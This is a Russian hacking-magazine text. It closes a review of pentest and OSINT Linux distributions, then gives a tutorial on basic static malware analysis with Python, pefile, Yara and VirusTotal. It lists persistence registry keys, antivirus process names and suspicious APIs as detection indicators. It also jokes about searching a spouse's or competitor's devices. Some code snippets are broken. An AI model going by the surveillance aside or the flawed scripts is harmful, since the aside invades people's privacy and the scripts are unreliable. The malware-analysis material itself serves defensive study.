 ка их установить, скорее всего, вызовет сбои в нормальной работе ОС, если
 не выведет ее из строя полностью.
    Короче, Kali как спички — мощная штука в умелых руках, ее легко дос тать,
 но детям лучше не давать. Охва тить разом все возможные официальные
 и неофициальные утилиты (а их, на минуточку, больше 600) этой системы
 не представляется возможным хотя бы потому, что постоянно появляются
 новые и новые модули, фреймворки, ути литы и прочие прибамбасы.
     Kali предназначена для широкого спектра задач, но основная из них —
 атаки в сетевой среде, нап ример, поиск уязвимостей в веб‐при ложениях
 и получение доступа к беспроводным сетям. Как нас ледник BackTrack, Kali
 вообще неплохо приспособ лена для работы с бес провод ными каналами свя‐
  зи, в особенности Wi‐Fi. Проверка на прочность удаленных хостов тоже воз‐
 можна с помощью, например, Metasploit (подробнее о нем — в нашем не‐
 давнем обзоре), но именно на работу с Wi‐Fi ориентировано ядро и зна‐
 чительная часть инструментов.
   Еще из плюсов отмечу наличие в штатной пос тавке большого количества
 словарей для различных атак, не только на Wi‐Fi, но и на аккаунты в интерне те
 и на сетевые службы.





                                    Kali работает в WSL

 Для еще большего удобства использования на официальном сайте предлага‐
 ется версия дистрибутива для виртуальных машин, ведь при взломе куда
 разумнее использовать систему без установки — мало ли кто потом будет
 копаться в твоем компе!
    Вердикт такой: если умеешь пользоваться — классная шту ка, но не взду‐
 май показывать ее ребенку. Один из авторов видел, что будет, если нарушить
 это указание.


     DEFT

  • Первый релиз: 2005 год
  • Основан на: Ubuntu
  • Платформы: x86
  • Графическая обо лоч ка: LXDE


 Скачать





 Родина DEFT — сол нечная Италия, и он щедро, как пицца сыром, посыпан
 разнообразными инстру ментами для раз ведки и взлома. При этом они
 не примотаны к дистрибутиву синей изо лен той, а вполне гармонично встро‐
 ены в него. Все вместе напоминает интерес ный и полезный в жизни швей‐
 царский нож.
    Разработан DEFT на платформе Lubuntu и снабжен удобным графичес ким
 интерфейсом. В продукт входит набор профильных утилит, начиная с анти‐
 вирусов, систем поиска информа ции в кеше браузера, сетевых сканеров
 и других полезностей и заканчивая инстру ментами, которые необходимы
 при поиске скрытой информации на диске.
   Используя эту ОС, не составит тру да получить доступ к стертым, зашиф‐
 рованным или поврежденным данным на раз личных видах физических
 носителей.
   Основной инструментарий пря чется в раз деле DEFT, который, в свою оче‐
 редь, находится в некото ром подобии меню «Пуск».





 Изначально этот дистрибутив был предназна чен для нужд сетевой полиции
 и специалистов по реагированию на инци денты в области ИБ, поэтому
 еще одна сильная сторона DEFT — это конкурентная разведка, в том числе
 анализ взаимосвязей аккаунтов соцсетей.
    Есть даже интересная утилита для обнаружения геолокации заданного
 аккаунта LinkedIn или Twitter. Я не смог проверить, нас колько эффективно
 это работает в данный момент, но с определением принадлежности аккаунта
  к стране и городу она справляет ся.
   В отличие от Kali Linux или Tsurugi, в DEFT защита от дурака встроена.
 Без должной подготов ки почти ни один инс трумент попросту не запус тить,
 а без глубокого понимания работы защитных механизмов тут вообще делать
 нечего.
    Буквально каждое приложение или опция требует прав root, так что не спе‐
 ши сразу запускать все подряд или создавать неп ривилегированного поль‐
 зователя.
    Также я обнаружил «подарочек»: несколько репозиториев, откуда DEFT
 берет обновы, закрыты ключами. Пару дней я рылся по форумам, пока
 не нашел, откуда запросить данные, да и сами клю чи тоже нашлись.
   В итоге эта система хороша для форензики и расследования инцидентов,
 в особенности если есть физический доступ к носителям информации —
 будь то диск, флешка или смартфон (хакера, начальника, сотрудника, кон‐
 курента, жены, любовницы, ее бати — нужное подчеркнуть).


    TSURUGI

  • Первый релиз: 2018 год
  • Основан на: Ubuntu
  • Платформы: x86 (час тично), x64
  • Графическая обо лоч ка: MATE


 Скачать

    Этот дистрибутив вооб ще не очень известен в кругах ИБ‐специалистов —
 возможно, из‐за своей молодос ти. Одна ко Tsurugi — детище, рожденное сов‐
 местными усилиями создателей DEFT и Kali. Что из этого вышло? Давай пос‐
 мотрим!
     Tsurugi (это слово означает дву ручный японский меч) соз дан на основе
 Ubuntu, в качестве GUI используется MATE. Предназначен он больше
 для форензики или OSINT, нежели для пентеста, однако его инструментарий,
 как и некоторые особенности, поз воляют использовать его и в этом нап‐
 равлении. Изначально система поставляется в режиме live‐образа, но при
 желании можно произвести постоянную установку.





                      Стандартный рабочий стол

 Войдя в систему, видим нес ложный GUI, предусмотрительно обвешанный
 со всех сторон виджетами показателей загрузки процессора, жестких дисков,
 оперативной памяти, скорости сети и про чего.
    Да, рука создателей Kali тут довольно сильно заметна. В глаза сразу бро‐
 сается обилие предустановленных инстру ментов, которые нужны далеко
 не всегда. При этом интерфейс системы выглядит более чем минималис‐
 тично и компактно. А вот логика работы системы безопасности, как и работы
 с вебом или защиты от отслеживания, основана на лучших практиках DEFT.
    Весь основной арсенал рас положен в Applications → TSURUGI.





                      Меню Tsurugi

 Здесь и работа с образами, и анализ вредоносов, и вос становление данных,
  и, как упоминалось, набор утилит для OSINT.
    Стоит иметь в виду, что эта ОС, как и Kali, не имеет защиты от кривых рук.
 Она подойдет тем, кто имеет хорошие навыки работы с Linux и действу ет пре‐
 дусмотрительно и вдумчиво. Как и положено острому японскому мечу!
   Обширный инструментарий позволяет исполь зовать систему как муль‐
 титул для широкого спектра задач. Пусть Tsurugi и немного смахивает на Kali,
 серьезные различия все равно имеются. При том что некоторые из утилит так
 же, как и в Kali, работают некорректно или не работают вообще, процент
 проблемных тулз здесь намного мень ше, и видно, что об этом кто‐то заботит‐
  ся.
    Если по каким‐то причинам ты не хочешь использовать Kali, то Tsurugi ста‐
 нет достойным инстру ментом в твоем наборе. Пять звезд не пос тавим
 как минимум потому, что один из авто ров этого обзора отложил кирпич
 от звука меча при старте ОС… Впрочем, давай не будем о грустном.


                                       Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
       БОЕВОЙ LINUX
          ОБЗОР САМЫХ МОЩНЫХ ДИСТРИБУТИВОВ
                        ДЛЯ ПЕНТЕСТОВ И OSINT





   PARROT

 • Первый релиз: 2013
 • Основан на: Debian
 • Платформы: x86, x64, ARM
 • Графическая обо лоч ка: MATE


Скачать





Этот красивый дистрибутив Linux осно ван на Debian и раз работан командой
Frozenbox спе циально для тестов безопасности компьютерных систем, поис‐
ка и оценки различного ряда уяз вимос тей.
   Что же внутри? В качес тве окружения рабочего стола здесь все тот же
MATE. Опыт использования (субъективно) приятный.





Сверху, в разделе Application, ты найдешь утилиту Anon Surf. Одна из осо‐
бенностей Parrot — в ней предус тановлены некоторые средства аноними‐
зации, и при выборе Anonsurf Start весь тра фик системы будет перенап‐
равлен через Tor. В этом же разделе есть воз можность использовать DNS
проекта OpenNIC — это вненациональная альтернатива реестрам доменов
верхнего уровня. Здесь же, выб рав параметр Check  IP, можно проверить
текущий внешний IP.
   Второй раздел — Cryptography. Здесь стоит обратить вни мание на утилиту
GPA — это графический интерфейс программы GnuPG, пред назначенной
для шифрования информа ции и создания электронных циф ровых подписей.
Это, по сути, альтернатива шифрованию PGP. А если тебе нужен GPG, то
под рукой будет утилита zuluCrypt — ана лог VeraCrypt, который позволяет
шифровать папки, разделы, флешки и прочее.
  Следующий (и самый интерес ный) раздел — Parrot. В нем собраны именно
те утилиты для тестирова ния защищен ности компь ютерных систем, из‐за
которых эта ОС попала в наш обзор. Многие из пред ставленных ути лит нам
уже известны по Kali Linux, но есть и уникальные.
  Подробнее хотелось бы оста новиться на вкладке «Интернет». Здесь мы
видим предустановленный Tor Browser и биткойн‐кошелек Electrum, а так‐
же утилиту XSSer — фреймворк для обнаружения и экс плуатации XSS‐уяз‐
вимостей в веб‐приложениях. Тут же есть почтовый клиент Claws Mail,
это полноценный поч товый клиент с поддержкой шифрования GPG. Бонусом
идет Ricochet IM — децен тра лизо ванный анонимный мессенджер, работа‐
ющий через сеть Tor.
   Это, пожалуй, все осо бенности Parrot Security OS, о которых хотелось бы
рассказать. Как видно, Parrot OS подходит не толь ко для тестов на проник‐
новение, она может и слу жить ОС для ежедневного использования тем, кто
знает, зачем им это нужно.
  Нам Parrot показалась качественно и удобно сделанной ОС. Приятно
работать с системой, где не нужно предваритель но починять инстру менты.


  BLACKARCH

 • Первый релиз: неизвес тно
 • Основан на: Arch
 • Платформы: x64
 • Графическая обо лоч ка:  отсутству ет,  есть  несколько менеджеров
   рабочего стола

Скачать

   BlackArch — самый круп ный по объему обра за дистрибутив. Акту альная
версия занимает больше 14 Гбайт! Заг ружать, кстати, при желании можно
через торрент, и сидов всегда много.
  Оцени дружелюбие интерфейса: если тебе уда лось выкачать этого монс‐
тра и запустить его, нужно ввес ти логин и пароль, о которых ты дол жен про‐
честь на сайте в инструкции по установке (это root/blackarch, если что).
Про live‐пользователей, видимо, забыли.
   Дальше: после логина не видно никаких намеков на меню или что‐то
в этом роде. Перед нами практически голый Fluxbox, поэтому оно вызывается
по клику правой кнопкой мыши в любом месте рабочего стола.





                     Группы приложений BlackArch

Все приложения удоб но разложены по категориям в подменю blackarch
основного меню. Пред ставлены 49 категорий, в которых есть инструменты
на любой случай жизни. Навигация по меню с помощью мыши, как в Windows?
О нет, в этом дистрибутиве про мышь смело можно забыть. Только клавиату‐
ра, только хардкор! С дру гой сто роны, раз ты решил связаться с *nix‐сис‐
темами и взломом, глупо рассчитывать на что‐то другое.
   Что касается собственно инстру ментов, то тут представлены все популяр‐
ные и не очень  тулзы для взлома, включая, конечно, такие знаковые,
как Metasploit и BeEF XSS. Делать обзор всех инс трументов этого поис‐
тине огромного набора — занятие еще более без надежное, чем в случае
с Kali и Parrot. Так что я пройдусь по верхам, а ты, если будет инте ресно, смо‐
жешь углубиться в чтение документации настолько, насколько посчитаешь
нужным.





                            Wine атакует!

BlackArch не стесняется использовать Wine для запуска некоторых «нерод‐
ных» приложений. В качестве примера — mft2csv (на скриншоте выше),
который парсит MFT файловой системы NTFS для дальнейшего анализа.
В наличии имеется и Java (OpenJDK 14.0.1).





                    MSF тоже на месте

Терминал, как и в целом графичес кая оболочка сис темы, выглядит уныло,
зато версии софта актуальные. С одной сто роны, кажется, что хотели сделать
как в кино про хакеров, с другой — система все же впол не юзабельна, хотя
и требует серьезных навыков.
  В общем, если ты не готов пробираться через минное поле конфигов,
аргументов при запуске софта, гугленья на каж дый чих и прочие прелести
этого мультитула — смотри в сторону Kali и Parrot, там хоть что‐то можно сде‐
лать без настольного спра вочника. К новичкам BlackArch более чем нед‐
ружелюбна. И, ясен пень, не взду май ставить ее как основную.


   BACKBOX

 • Первый релиз: 2010
 • Основан на: Ubuntu
 • Платформы: x64
 • Графическая обо лоч ка: Xfce


Скачать

  И под конец — еще один дистрибутив, стоящий особняком от остальных.
BackBox не пре тендует на зва ние лучшего хакерского мультитула, зато он
как нельзя лучше подходит для повседневного использования. Графическая
оболочка  тут  Xfce, что минимизирует потребление сис темных ресурсов.
С сайта доступны для скачивания два варианта — ISO и Torrent. Образа
для виртуальных машин нет.
   BackBox основан на Ubuntu (точнее, Xubuntu), что делает удобным его
использование как домашней ОС,  к тому же по Ubuntu доступна куча
документации и форумов с ответами на распространенные вопросы. Тут нет
каких‐то твиков ядра, так что никакие махина ции ничего не испортят. Такие
особенности делают этот дистр прекрасным выбором для начинающе го пен‐
тестера.





                  Меню BackBox Linux 7

Инструментов из коробки пос тавляется не так и много, всего около 200 штук,
но для первых шагов в ИБ вполне дос таточно. В остальном BackBox —
это просто Xubuntu со всеми ее багами фичами и функци ями.
  Важный плюс, на который я не могу не обратить вни мание, — все инстру‐
менты очень удобно сгруппированы в меню. Даже если ты не знаешь ни одно‐
го инструмента, например, для атак на Wi‐Fi, ты с легкостью найдешь их.
   Сказать больше особо нечего, прос то пользуйся на здоровье.


СВОДНАЯ ТАБЛИЦА





ВЫВОДЫ
Тут должна была быть лекция, что недопустимо использовать большинство
из этих дистрибутивов как основную ОС, но ее не будет. Пробуй разные дис‐
тры, выбирай тот, что ближе тво ему сердцу, и жела ем тебе удачи. А еще —
чтобы из‐за исполь зования материалов этой статьи тебе никогда не понадо‐
билась недавняя заметка об отмазках в суде.
ВЗЛОМ

 МАЛВАРЬ
   НА ПРОСВЕТ





                                        Евгений Дроботун
                                        Постоянный автор «Хакера»




       УЧИМСЯ БЫСТРО ИСКАТЬ
    ПРИЗНАКИ ВРЕДОНОСНОГО КОДА





Представь, что на твоем компьюте ре возник неиз вестный
исполняемый файл, но отправ лять его на проверку в VirusTo‐
tal ты почему‐то не хочешь. Нап ример, потому что он может
уйти в исследовательскую лабораторию, где его присталь но
изучат. В этой статье я покажу тебе, как провести такое
исследование самостоятельно.


В целом, если говорить про ана лиз исполняемых файлов, можно выделить
два подхода — это статический анализ и динами чес кий анализ.





                Виды анализа исполня емых фай лов

Статический анализ предполага ет ана лиз файла без его запуска на выпол‐
нение. Он может быть базовым — в этом случае мы не анализируем непос‐
редственно инструкции про цес сора в фай ле, а производим поиск нетипичных
для обычных файлов артефактов (например, таких как строки или наз вания
и последовательности API‐функций), либо расширенным — в этом случае
файл дизассемблируется и производится исследова ние инструкций, поиск их
характерных для вредонос ных программ пос ледова тельностей и определе‐
ние того, что именно делала программа.
  Динамический анализ заключа ется в исследова нии файла с его запуском
в системе. Он тоже может быть базовым и расширенным. Базовый динами‐
ческий анализ — это исследование файла с его запус ком без использования
средств отладки, он заключа ется в отслеживании событий, связанных с этим
файлом (например, обра щение к реес тру, дис ковые операции, взаимодей‐
ствие с сетью и  т.  п.). Рас ширенный динамический анализ заключается
в исследовании поведения запущенного фай ла с примене нием средств
отладки.
  В этой статье я расскажу о базовых техниках ста тического анализа. Его
преимущества:
 • позволяет получить результат дос таточно быстро;
 • безопасен для системы при соблюдении минимальных мер предосторож‐
   ности;
 • не требует подготов ки специальной среды.

Основной недостаток базового ста тичес кого ана лиза — это его низкая
эффективность при анализе и рас позна вании сложных вре доносных прог‐
рамм, например упакованных неизвес тным упаковщиком или использующих
полное либо частичное шифрование файла с применением прод винутых
алгоритмов.


ИНСТРУМЕНТАРИЙ
HEX-редакторы
Один из основных инстру ментов ста тического базового анализа — это HEX‐
редактор. Их много, но в первую очередь необ ходимо отме тить Hiew.
Это безусловный лидер и бес тселлер. Помимо непосредс твенно функций
HEX‐редактора, в нем реализовано еще много дополнительных возможнос‐
тей, связанных с анализом файла: это и дизассемблер, и просмотрщик сек‐
ций импорта и экспорта, и ана лизатор заголовка исполняемых файлов. Глав‐
ный недостаток — все это не бесплатно (хотя и весьма недорого —
от 555 рублей).





                         HEX‐редактор Hiew

Если не хочется тратить деньги, то можно обра тить внимание, например,
на Hex Editor Neo (есть бесплатный вариант) или на HxD Hex Editor.


Детекторы упаковщиков
Если есть подозрение, что файл упа кован, то с помощью детектора упаков‐
щиков можно попытаться определить, какой упаковщик при этом исполь‐
зовал ся, и попробовать рас паковать исследуемый файл. Дол гое вре мя
безусловным лидером здесь была прог рамма PEiD, и в принципе можно
пользоваться и ей, одна ко поддержка давно прекращена и новых сигнатур
для определения типов упа ковщика уже никто не выпус кает. Альтернатива —
Exeinfo PE.





                                   Exeinfo PE

Эта программа, помимо детекта упаковщиков, имеет еще много других фун‐
кций для анализа исполняемых файлов Windows, и во многих случаях можно
обойтись ей одной.


Специализированные утилиты для исследования исполняемых
файлов Windows
Программа CFF Explorer из пакета Explorer Suite — это нас тоящий швейцар‐
ский нож для иссле дова теля PE‐файлов. Позволя ет получить огромное
количество разнообразной информа ции обо всех компонентах структуры PE‐
файла и, помимо прочего, может служить HEX‐редактором.





                         CFF Explorer

Так что настоятельно рекомендую CFF Explorer, тем более что программа
бесплатная.


Python-модуль pefile
Python‐модуль peﬁle поз волит обойтись при ана лизе PE‐файлов исклю‐
чительно  интерпретатором  Python. С ним  практически  все  опе рации
по базовому статическому анализу можно реализовать путем написания
небольших скриптов. Прелесть всего этого в том, что заниматься иссле дова‐
нием PE‐файлов можно в Linux.
  Модуль присутствует в PyPi, и уста новить его можно через pip:


pip install pefile


Yara
Ну и в завершение всего списка весь ма популярный и востре бованный инс‐
трумент, став ший своеобразным стандартом в среде анти вирусной индус‐
трии, — проект Yara. Разработ чики позиционируют его как инс трумент,
который помогает исследователям малвари идентифицировать и  клас‐
сифицировать вредоносные сэмплы. Исследователь может соз дать описания
для разного типа малвари в виде так называ емых правил, используя тексто‐
вые или бинарные паттерны.


        WWW

                     •Актуальная версия Yara
                    •Англоязычная справка по написанию правил
                    •Перевод  справки  на  русский  (обрати  вни‐
                       мание — он слегка устарел)



МЕРЫ ПРЕДОСТОРОЖНОСТИ
Чтобы обезопасить систему при проведении базового статического анализа
подозрительных файлов, необходимо:
 • установить запрет на операцию чтения и выпол нения анализи руемого
  файла (вкладка «Безопасность» в контекстном меню «Свойства»);
 • сменить разрешение файла с .exe на какое‐нибудь другое (или вообще
   убрать расширение анализируемого файла);
 • не пытаться открыть файл текстовыми про цес сорами и браузерами.

Можно обойтись этими мерами и не использовать виртуальную среду, хотя
для пол ной безопасности можешь установить, нап ример, Virtual Box и про‐
водить анализ в нем (тем более что при динамичес ком анализе без виртуал‐
ки, как правило, не обой тись).


ОПРЕДЕЛЕНИЕ ТИПА ФАЙЛА
Я думаю, тебе известно, что признак PE‐фай ла в Windows — это не только
расширение .exe, .dll, .drv или .sys. Внутри него содержатся и другие отли‐
чительные черты. Первая из них — это сигнатура из байт вида MZ (или 0x4d,
0x5a в шестнадцатеричном представлении) в самом начале файла. Вторая —
сигнатура также из двух байт PE и двух нулевых байтов следом (или 0x50,
0x45, 0x00, 0x00 в шестнадцатеричном представлении).
  Смещение этой сигнатуры относитель но начала файла записано в так
называемом DOS‐заголовке в поле e_lfanew, которое находится по сме‐
щению 0x3c от начала файла.


        WWW

                    •Описание формата PE на сайте Microsoft
                       •«Исследуем Portable Executable» (Codeby.net)


По большому счету наличие этих двух сигнатур в файле и под ходящее рас‐
ширение свидетельствует о том, что перед нами именно PE‐файл, однако
при желании можно пос мотреть еще зна чение поля Magic опционального
заголовка (Optional Header). Это значение находится по смещению 0x18 отно‐
сительно начала сигнатуры PE. Зна чение этого поля определяет разрядность
исполняемого файла:
 • значение 0x010b говорит о том, что файл 32‐разрядный (помни, что
   в памяти числа располагаются с обратной пос ледовательностью байтов,
   сначала младший байт и далее старшие байты, то есть число 0x010b будет
   представ лено последова тельностью 0x0b, 0x01);
 • значение 0x020b говорит о том, что файл 64‐раз рядный.

Посмотреть это все можно нес колькими способами. Первый — с помощью
HEX‐редактора.





              Признаки PE‐файла в HEX‐редакторе Hiew

Второй — используя CFF Explorer или Exeinfo PE. Они наглядно показы вают
значения указанных сигнатур.
   Третий способ — использовать возможности Python, запустив такой
скрипт:


with open(<путь к файлу>, 'rb') as file:
  # прочитаем первые 1000 байт файла (больше и не надо)
  buffer = file.read(1000)


  e_ifanew = int.from_bytes(buffer[0x3c:0x40], byteorder='little')
  mz_signature = buffer[0x0:0x2]
  pe_signature = buffer[e_ifanew:e_ifanew + 0x4]
  magic = buffer[e_ifanew + 0x18:e_ifanew + 0x1a]
  if mz_signature == b'MZ' and pe_signature == b'PE\x00\x00':
  if magic == b'\x0b\x01':
    print('Файл', sys.argv[1], 'является исполнимым PE32 файлом
Windows.')
  elif magic == b'\x0b\x02':
    print('Файл', sys.argv[1], 'является исполнимым PE64 файлом
Windows.')
  else:
    print('Файл', sys.argv[1],'не является PE файлом Windows.')

Или можешь использовать вот такое пра вило для Yara:


import "pe" //импортируем Yara‐модуль pe
rule is_pe_file
{
  strings:
    $MZ_signature = "MZ"


  condition:
    ($MZ_signature at 0) and (pe.is_32bit() or pe.is_64bit())
}


ПОИСК В VIRUSTOTAL ПО ХЕШУ
Отправить на VirusTotal для проверки можно не толь ко сам файл, но и его хеш
(md5, sha1 или sha256). В этом случае, если такой же файл уже анализи‐
ровался, VirusTotal покажет результаты этого анализа, при этом сам файл
на VirusTotal мы не засветим.
  Думаю, как узнать хеш файла, ты прекрасно знаешь. В крайнем случае
можно написать небольшой скрипт на Python:


import hashlib
with open(<путь к файлу>, 'rb') as file:
  buffer = file.read()
  print('md5 =', hashlib.md5(buffer).hexdigest())
  print('sha1 =', hashlib.sha1(buffer).hexdigest())
  print('sha256 =', hashlib.sha256(buffer).hexdigest())

Результат подсчета хеша шлем на VirusTotal либо применяем мои рекомен‐
дации из статьи «Тотальная проверка. Используем API VirusTotal в своих про‐
ектах» и автоматизируем этот процесс с помощью небольшого скрипта
на Python.


import sys
import requests


# будем использовать 2‐ю версию API VirusTotal
api_url = 'https://www.virustotal.com/vtapi/v2/file/report'
# не забудь про ключ доступа к функциям VirusTotal
params = dict(apikey=<ключ доступа к API VirusTotal>, resource=str(
sys.argv[1]))


response = requests.get(api_url, params=params)
if response.status_code == 200:
  result = response.json()
  if result['response_code'] == 1:
    print('Обнаружено:', result['positives'], '/', result['total'])
    print('Результаты сканирования:')
    for key in result['scans']:
      print('\t' + key, '==>', result['scans'][key]['result'])
  elif result['response_code'] == ‐2:
    print('Запрашиваемый объект находится в очереди на анализ.')
  elif result['response_code'] == 0:
    print('Запрашиваемый объект отсутствует в базе VirusTotal.')
  else:
    print('Ошибка ответа VirusTotal.')
else:
  print('Ошибка ответа VirusTotal.')

Как видишь, скрипт получа ет зна чение хеша, переданного в виде аргумента
командной строки, формиру ет все нужные запросы для VirusTotal и выводит
результаты анализа.
   Если VirusTotal выдал в ответ какие‐нибудь результаты анализа, это значит,
что иссле дуемый файл уже кто‐то загружал для анализа и его можно заг‐
рузить туда повторно и получить более актуальные результаты, на чем анализ
можно и завершать. Но вот если VirusTotal не най дет файла в базах, тогда есть
смысл идти дальше.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
МАЛВАРЬ НА ПРОСВЕТ
               УЧИМСЯ БЫСТРО ИСКАТЬ ПРИЗНАКИ
                        ВРЕДОНОСНОГО КОДА





ПОИСК И АНАЛИЗ СТРОК
Некоторые строки внутри файла могут явно свидетельствовать о его зло‐
намеренности, а иногда по ним даже понятно, что конкретно он делает. Нап‐
ример, URL или IP‐адреса внутри файла подска жут, что она взаимодей ству ет
с какими‐то серверами (их, кстати, тоже можно пробить через VirusTotal
на вредоносность).
  Могут попадаться и стро ки с клю чами реес тра. Например, вот такие пути
будут явно указывать на желание файла закрепиться в системе надол го:


HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run

Скорее всего, вместе с такими строками в секции импорта найдутся и зап‐
росы к функциям API, которые манипулируют клю чами реес тра.
   Строки можно напрямую поискать с помощью HEX‐редактора, а можно
использовать консоль ную  утилиту  Strings из сос тава  Sysinternals  Suite,
которая выводит весь текст, что найдет в файле. Строкой утилита считает
любую последовательность из трех и более символов ASCII или Unicode,
которая завершается нулевым символом.
  Кроме URL, IP и клю чей реес тра сто ит обратить внимание на следующие
разновидности тек стовых данных.
 • Строки с именами процессов антивирусных программ и различных утилит
   исследования системы (нап ример, avp.exe для Касперского, ekrn.exe
   для ESET, drweb32.exe для DrWeb или procexp.exe для Process Explorer
   из состава Sysinternals Suite). Они могут свидетельствовать о том, что
   программа ищет эти про цес сы и собирается их завершить.
 • Строки с име нами процессов средств вир туализации (например, VBox
  Tray.exe или VBoxService.exe для Virtual Box, prl_cc.exe или prl_
  tools.exe для Parallels, vmsrvc.exe или vmusrvc.exe для Virtual PC)
   могут означать, что программа пытается определить, что ее запускают
   в виртуальной машине.
 • Строки с именами процессов браузеров (iexplore.exe, firefox.exe,
  chrome.exe и т. п.) — возможно, признак внедрения кода в эти браузеры.
   Это может понадобиться для перехвата трафика или вводимой информа‐
   ции. Как вариант, прог рамма может пытать ся загрузить расширение
   или даже исполь зовать целевой эксплоит для бра узера.
 • Строки с именами системных про цес сов (explorer.exe, svchost.exe
   и т. д.) могут быть признаком попыток внедрения вредоносного кода в эти
   процессы либо признаком запуска вредоносных процес сов под видом
   системных. Иногда для поиска и манипуляций с процессом explorer.
  exe используют имя его окна — progman. Стоит поис кать и его.
 • Строки подозрительного содержания. Например, что‐нибудь типа key
  logger.txt или Portscanner startip.

Для Yara можно написать универсальные пра вила, которые помогут искать
строки, применив регулярные выражения. Например, для поиска URL или IP
в файле можно написать так:


rule URL
{
  strings:
    $url = /(https?:\/\/) ?([\w\.] +)\.([ a‐z]{ 2,6}\. ?)(\/[\w\.]*)*\/?/
wide ascii


  condition:
    $url
}


rule IP
{
  strings:
    $ip = /([ 0‐9]{ 1,3}\.){ 3}[ 0‐9]{ 1,3}/ wide ascii


  condition:
    $ip
}

Создатели некоторых вредоносов специально шифруют строки, но серь‐
езные алгоритмы шифрования в таких случаях — это ред кость. Так что шиф‐
ровки можно поискать консольной утилитой Floss (FireEye Labs Obfuscated
String Solver). Как и Strings, она ищет строки в файле, но иногда позволяет
найти обфусцированные или зашифрованные варианты.


        WWW

                    •Подробнее об использовании  Floss в блоге
                            FireEye


Часто вирусописатели не заморачиваются и шифруют строки при помощи
XOR. Такие строки легко найти при помощи пра вила для Yara.


rule xor_string
{
  strings:
    $string = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
xor


  condition:
    $string
}

Такое правило будет искать в файле строку с клю чом реестра, поксоренную
производным байтом. К сожалению, с регулярными выражениями модифи‐
катор xor применить нельзя.


             INFO

                   Еще одна удобная программа для поиска строк —
                        это pestudio. Она отмечает все подозрительные
                        строки, на которые сто ит обратить внимание.



АНАЛИЗ ИНФОРМАЦИИ PE-ЗАГОЛОВКА
При компиляции PE‐файла в него вклю чается заголовок (PE‐header), который
описывает структуру файла. При выполнении файла загрузчик ОС читает
информацию из этого заголовка, а затем копирует содержимое файла
в память и передает ему исполнение.
  Заголовок PE содержит в себе много информа ции, например по какому
адресу PE‐файл дол жен быть загружен в память, адрес запуска (он же — точ‐
ка входа), списки библиотек, функций и ресурсов, которые файл будет
использовать. Так что изучение заголовка дает при исследовании очень мно‐
гое.


Анализ таблицы импорта
Большинство программ, в том числе вредонос ных, используют API‐функции,
которые предоставляет операционная система. Их код содержится в разных
DLL, откуда их и импортирует исполня емый файл. Собс твенно, перечень этих
функций, содержащийся в заголовке, — это один из самых полезных фраг‐
ментов информации при исследовании. Стоит на него взглянуть, и уже при‐
мерно понимаешь, что делает программа.
  Все это можно посмотреть в так называ емой таблице импорта. Например,
при помощи CFF Explorer.





                   Таб лица импорта в CFF Explorer

Или можно использовать Hiew.





                      Таб лица импорта в Hiew

Как вариант, здесь во всей кра се может показать себя Python‐модуль peﬁle.
Для вывода секции импорта можно использовать такой скрипт:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
  for dll_entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(dll_entry.dll.decode('utf‐8'))
  for api_entry in dll_entry.imports:
    print('\t' + api_entry.name.decode('utf‐8'))
else:
  print('Файл не содержит секцию импорта.')





        Вывод таблицы импорта с помощью скрипта на Python

Вот наиболее популярные DLL, которые встречаются в любых программах:
 • kernel32.dll —  содержит  базовые функции:  доступ  и  управле ние
   памятью, работа с файлами и устройства ми;
 • advapi32.dll — обес печивает дос туп к ключевым компонентам Windows
   (диспетчер служб, реестр), а также содержит API‐функции криптогра‐
   фической подсистемы Windows;
 • user32.dll — содержит компоненты графического интерфейса;
 • gdi32.dll — содержит функции графических операций;
 • winnet.dll — содержит высоко уровневые сетевые API‐функции, реали‐
  зующие такие протоко лы, как FTP, HTTP и NTP.

На что стоит обратить внимание при исследова нии таблицы импорта?
  В  первую  очередь —  на  наличие  биб лиотек   ntdll.dll,  wsock32.dll
и ws2_32.dll. Эти библиотеки редко встречаются в обычных программах, пос‐
кольку содержат в себе низкоуровневые API‐функции.
 •  ntdll.dll содержит функции доступа к компонентам системы. Если встре‐
   тишь импорт API из это го DLL, это может озна чать, что программа пыта‐
   ется перехватить системные функции, реализует раз ные антиотладочные
   приемы, манипулирует процессами, противо дей ствует антивирусам и т. п.
 • wsock32.dll  и   ws2_32.dll  содержат  низкоуровневые   API‐функции
   для работы с сокетами. Они обычно используются в узкоспециализиро‐
   ванном ПО — и если встретят ся при ана лизе обычной программы,
   это должно насторожить.

Наличие библиотеки advapi32.dll и криптогра фических API‐функций вроде
CryptGenKey, CryptEncrypt, CryptDecrypt и подобных сразу вызывает
подозрение, что перед нами очередной шифровальщик‐вымогатель. Соз‐
датели таких программ часто используют стандартные крипто‐API, а не при‐
думывают собственные реализации.
  Наличие этой же библиотеки вкупе с вызовом функций работы с реестром
(типа RegCreateKeyEx, RegEnumKeyEx, RegDeleteKeyExA и  т.  п.) говорит
о манипуляциях с реестром и возможной записи в автозагрузку. Подтвержда‐
ет это наличие строк с соот ветс твующими ключами реес тра.
   Также стоит обратить внимание на слишком маленький импорт или его
отсутствие. Это крайне нетипично для обычных программ. Также не совсем
типично присутствие в импорте связ ки API‐функций LoadLibrary и GetPro‐
cAddress (либо LdrLoadDll и LdrGetProcAddress). Это однозначно говорит
о реализации так называ емого импорта времени выполнения (в отличие
от динамического импорта, когда все импортируемые функции перечислены
в секции импорта) и свидетельствует о попытке скрыть настоящее наз‐
начение файла. Либо это может говорить о том, что файл упакован.


             INFO

                       Как правило при использовании связки LoadLi‐
                   brary (или LoadLibraryEx) и GetProcAddress
                        (или LdrLoadDll  +  LdrGetProcAddress)
                      необходимы  имена  функций,  которые  будут
                      импортироваться  во  время выполнения  прог‐
                     раммы, поэтому если нашел эти API в импорте,
                         есть смысл поискать строки с име нами импорти‐
                     руемых  во  время  выполнения  API‐функций.
                    При этом стоит помнить, что они могут быть
                    зашифрованы или обфусцированы.


Следующие API или их связ ки также требуют особого внимания. Их наличие
в исследуемом файле — повод нас торожиться.
 • Связка из VirtualAlloc и VirtualProtect или HeapAlloc и Virtu
  alProtect может свидетельствовать о рас паковке рабочей нагрузки вре‐
   доносного файла.
